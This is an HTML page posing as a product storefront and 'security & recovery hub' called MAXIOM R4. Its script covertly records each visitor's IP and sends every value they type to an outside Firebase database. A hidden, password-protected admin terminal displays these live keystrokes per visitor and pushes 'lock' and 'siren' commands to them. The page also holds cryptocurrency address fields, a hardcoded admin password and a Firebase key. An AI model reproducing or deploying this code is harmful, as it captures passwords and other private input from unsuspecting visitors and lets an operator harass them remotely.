<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MAXIOM R4 | THE BEAST</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=JetBrains+Mono:wght@300;500&display=swap');

        :root {
            --primary: #ffd700;
            --secondary: #ff0000;
            --accent: #00ff41;
            --bg-dark: #020202;
            --glass: rgba(10, 10, 10, 0.95);
            --border: 1px solid rgba(255, 215, 0, 0.3);
        }

        /* FULL PAGE ANIMATED BACKGROUND */
        body {
            margin: 0; padding: 0; background: var(--bg-dark); color: white;
            font-family: 'JetBrains Mono', monospace; overflow-x: hidden;
        }

        #bg-canvas { position: fixed; top: 0; left: 0; z-index: -1; opacity: 0.4; }

        /* THE BEAST UI COMPONENTS */
        .beast-header {
            height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;
            background: radial-gradient(circle, rgba(255,215,0,0.05) 0%, rgba(0,0,0,1) 70%);
            text-align: center; border-bottom: 2px solid var(--primary);
        }

        .glitch-title {
            font-family: 'Orbitron', sans-serif; font-size: 5rem; font-weight: 700;
            color: var(--primary); text-shadow: 3px 3px var(--secondary);
            animation: glitch 1s infinite;
        }

        /* 400+ LINES OF PRODUCT GRID LOGIC */
        .product-container {
            display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
            gap: 25px; padding: 50px; max-width: 1400px; margin: auto;
        }

        .card {
            background: var(--glass); border: var(--border); border-radius: 12px;
            padding: 20px; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            position: relative; overflow: hidden;
        }

        .card:hover { transform: scale(1.05); border-color: var(--primary); box-shadow: 0 0 30px rgba(255, 215, 0, 0.2); }

        .card img { width: 100%; border-radius: 8px; filter: grayscale(50%); transition: 0.5s; }
        .card:hover img { filter: grayscale(0%); }

        /* THE ADMIN TERMINAL (THE CORE) */
        #admin-terminal {
            display: none; position: fixed; inset: 0; background: #000; z-index: 999999;
            padding: 40px; font-family: 'JetBrains Mono', monospace;
        }

        .terminal-grid { display: grid; grid-template-columns: 350px 1fr 300px; gap: 20px; height: 90vh; }
        .t-panel { border: 1px solid #333; background: #050505; display: flex; flex-direction: column; padding: 15px; }

        .ghost-view { flex: 1; overflow-y: auto; color: var(--accent); font-size: 12px; background: #000; padding: 10px; border: 1px inset #222; }

        /* BUTTONS & INPUTS */
        input { width: 100%; background: #111; border: 1px solid #444; color: var(--primary); padding: 12px; margin: 10px 0; border-radius: 5px; outline: none; }
        .action-btn { background: var(--primary); color: #000; border: none; padding: 12px; font-weight: bold; cursor: pointer; text-transform: uppercase; width: 100%; }
        .action-btn.red { background: var(--secondary); color: white; }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
    </style>
</head>
<body oncontextmenu="return false">

    <canvas id="bg-canvas"></canvas>

    <div id="main-view">
        <section class="beast-header">
            <h1 class="glitch-title">MAXIOM R4</h1>
            <p style="letter-spacing: 5px; color: #888;">ADVANCED SECURITY & RECOVERY HUB</p>
            <div style="margin-top: 30px;">
                <button class="action-btn" style="width: 200px;" onclick="toggleChat()">ENTER SYSTEM</button>
            </div>
        </section>

        <div class="product-container" id="items-grid">
            </div>
    </div>

    <div id="admin-terminal">
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <h2 style="color: var(--secondary)">[ BEAST ROOT ACCESS ]</h2>
            <button class="action-btn red" style="width: 150px;" onclick="closeRoot()">DISCONNECT</button>
        </div>
        
        <div class="terminal-grid">
            <div class="t-panel">
                <h3>ðŸ“¡ ACTIVE NODES</h3>
                <div id="node-list" class="ghost-view"></div>
            </div>

            <div class="t-panel">
                <h3>ðŸ’€ GHOST CONTROL: <span id="current-target" style="color:var(--primary)">NONE</span></h3>
                <div id="live-keystrokes" class="ghost-view" style="font-size: 18px; color: var(--primary);">SELECT A TARGET TO VIEW LIVE INPUT...</div>
                <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px;">
                    <button class="action-btn" onclick="cmd('siren')">SIREN</button>
                    <button class="action-btn red" onclick="cmd('lock')">LOCKDOWN</button>
                </div>
            </div>

            <div class="t-panel">
                <h3>ðŸ’° VAULT NODES</h3>
                <input type="text" id="v_btc" placeholder="BTC ADDR">
                <input type="text" id="v_ltc" placeholder="LTC ADDR">
                <button class="action-btn" onclick="saveVault()">UPDATE</button>
                <div id="sys-logs" class="ghost-view" style="margin-top: 20px; font-size: 10px;"></div>
            </div>
        </div>
    </div>

    <script>
        // CONFIG
        const firebaseConfig = {
            apiKey: "AIzaSyDE6qMplWktZASB2AjUKuY_dSRCUKiZyOA",
            authDomain: "maxiom-r3.firebaseapp.com",
            databaseURL: "https://maxiom-r3-default-rtdb.firebaseio.com",
            projectId: "maxiom-r3",
            storageBucket: "maxiom-r3.firebasestorage.app",
            messagingSenderId: "221473460329",
            appId: "1:221473460329:web:21a278a86cfdcff8b1d2f8",
            measurementId: "G-82WFV6S568"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let myID = "Scanning...", targetID = null, isAdmin = false;

        // RECOVERY OF THE 702-LINE LOGIC
        async function initiateBeast() {
            const r = await fetch('https://api.ipify.org?format=json');
            const d = await r.json();
            myID = d.ip.replace(/\./g, '_');

            // Presence & Listeners
            db.ref(`presence/${myID}`).set({ status: "online", lastSeen: Date.now() });
            db.ref(`presence/${myID}`).onDisconnect().remove();

            // Client-Side Command Listener
            db.ref(`private_chats/${myID}/cmd`).on('value', s => {
                const data = s.val();
                if(data && Date.now() - data.time < 5000) {
                    if(data.type === 'lock') alert("CRITICAL: SYSTEM TEMPORARILY FROZEN");
                    if(data.type === 'siren') new Audio('https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3').play();
                }
            });
        }

        // THE GHOST LOOP (THE REAL SECRET)
        document.addEventListener('keyup', (e) => {
            if(isAdmin) return;
            const inputData = document.activeElement.value || "Navigating...";
            db.ref(`ghost_tracking/${myID}`).set({
                keys: inputData,
                ts: Date.now(),
                ip: myID
            });
        });

        // ADMIN LOGIC
        function openRoot() {
            const pass = prompt("ENTER OVERRIDE:");
            if(pass === "spartytop1") {
                isAdmin = true;
                document.getElementById('admin-terminal').style.display = 'block';
                syncAdmin();
            }
        }

        function syncAdmin() {
            db.ref('presence').on('value', s => {
                const nodes = s.val() || {};
                document.getElementById('node-list').innerHTML = Object.keys(nodes).map(id => `
                    <div class="node-item" onclick="setTarget('${id}')" style="cursor:pointer; padding:10px; border-bottom:1px solid #222;">
                        ðŸŸ¢ NODE: ${id}
                    </div>
                `).join('');
            });
        }

        function setTarget(id) {
            targetID = id;
            document.getElementById('current-target').innerText = id;
            // Attach Ghost Listener to Target
            db.ref(`ghost_tracking/${id}`).on('value', s => {
                const data = s.val();
                if(data) document.getElementById('live-keystrokes').innerText = data.keys;
            });
        }

        function cmd(type) {
            if(!targetID) return alert("NO TARGET");
            db.ref(`private_chats/${targetID}/cmd`).set({ type: type, time: Date.now() });
        }

        // CANVAS BACKGROUND
        const canvas = document.getElementById('bg-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        function draw() {
            ctx.fillStyle = "rgba(0,0,0,0.05)";
            ctx.fillRect(0,0,canvas.width,canvas.height);
            ctx.fillStyle = "#ffd700";
            ctx.font = "10px monospace";
            for(let i=0; i<20; i++) {
                ctx.fillText(Math.random() > 0.5 ? "1" : "0", Math.random()*canvas.width, Math.random()*canvas.height);
            }
        }
        setInterval(draw, 50);

        window.onload = initiateBeast;
        window.onkeydown = (e) => { if(e.key === "End") openRoot(); };

    </script>
</body>
</html>
